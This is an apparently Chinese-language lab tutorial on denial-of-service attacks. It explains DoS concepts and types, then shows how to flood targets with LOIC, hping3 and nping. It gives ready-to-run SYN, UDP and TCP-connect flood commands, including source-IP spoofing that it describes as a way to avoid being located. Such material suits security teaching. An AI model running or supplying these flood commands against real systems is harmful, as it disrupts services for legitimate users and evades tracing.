## 简介

### 概念：

DoS攻击通常是利用传输协议的漏洞、系统存在的漏洞、服务的漏洞，对目标系统发起大规模的进攻，用超出目标处理能力的海量数据包消耗可用系统资源、带宽资源等，或造成程序缓冲区溢出错误，致使其无法处理合法用户的正常请求，无法提供正常服务，最终致使网络服务瘫痪，甚至引起系统死机。这是破坏攻击目标正常运行的一种“损人不利己”的攻击手段。

最常见的DoS攻击行为有网络带宽攻击和连通性攻击。带宽攻击指以极大的通信量冲击网络，使得所有可用网络资源都被消耗殆尽，最后导致合法的用户请求无法通过。连通性攻击指用大量的连接请求冲击计算机，使得所有可用的操作系统资源都被消耗殆尽，最终计算机无法再处理合法用户的请求。

### 分类：

主要有Land攻击、死亡之ping、泪滴、Smurf攻击及SYN洪水等。

## 实验内容

这次我们主要介绍简单关于TCP，UDP等相关攻击的工具的使用

### 一：使用LOIC（卢瓦，低轨道离子炮）攻击

最知名的DOS工具之一，黑客组织匿名者官方使用工具。支持TCP/UDP/HTTP大规模流量泛洪。

###  ** **LOIC使用方法****

1、选择URL或IP；

2、设置攻击模式(HTTP,UDP,TCP)、端口号(PORT)、线程(Threads)、速度(可拉)

3、启动攻击（点击IMMA CHARGIN MAH LAZER）

![](https://image.3001.net/images/20210513/1620914167_609d2ff713fe712959d49.png!small)4、效果（开启Wireshark抓包）

![](https://image.3001.net/images/20210513/1620914480_609d31300fca7ea38f479.png!small)

###  ** **二：使用hping3（kali）进行DoS攻击****

  * -c：发送数据包的个数
  * -d：每个数据包的大小
  * -S：发送SYN数据包
  * -w：TCP window大小
  * -p：目标端口，你可以指定任意端口
  * –flood：尽可能快的发送数据包
  * –rand-source：使用随机的IP地址，使得安全设备不能定位实际IP；
  * -a或–spoof：隐藏主机名
  * com：目的IP地址或网站

例：使用hping3进行TCP攻击

hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source ip/域名

![](https://image.3001.net/images/20210513/1620914836_609d3294b290be990df66.png!small)

![](https://image.3001.net/images/20210513/1620914867_609d32b38ab0c8b38abf7.png!small)

还有很多攻击方式如：

###  ** **SYN Flood****

# hping3 -S --flood -V testsite.com

### UDP Flood

– hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2

-s:指定源端口，不指定也可以

方法还有很多就不截图了大家自己去调试！

### 三： ** **使用Nping3（kali）进行DoS攻击****

TCP全链接DoS攻击  
– nping --tcp-connect --rate=10000 -c 1000000000 -q 192.168.33.135  
\--tcp-connect：建立tcp连接 --rate=10000：速率一万个

例： ** **使用nping实现TCP连接攻击：****

# nping --tcp-connect -rate=90000 -c 900000 -q ip/域名

![](https://image.3001.net/images/20210513/1620915698_609d35f2d5343124da7b8.png!small)![](https://image.3001.net/images/20210513/1620915784_609d3648a4c19d7cc21f3.png!small)

  

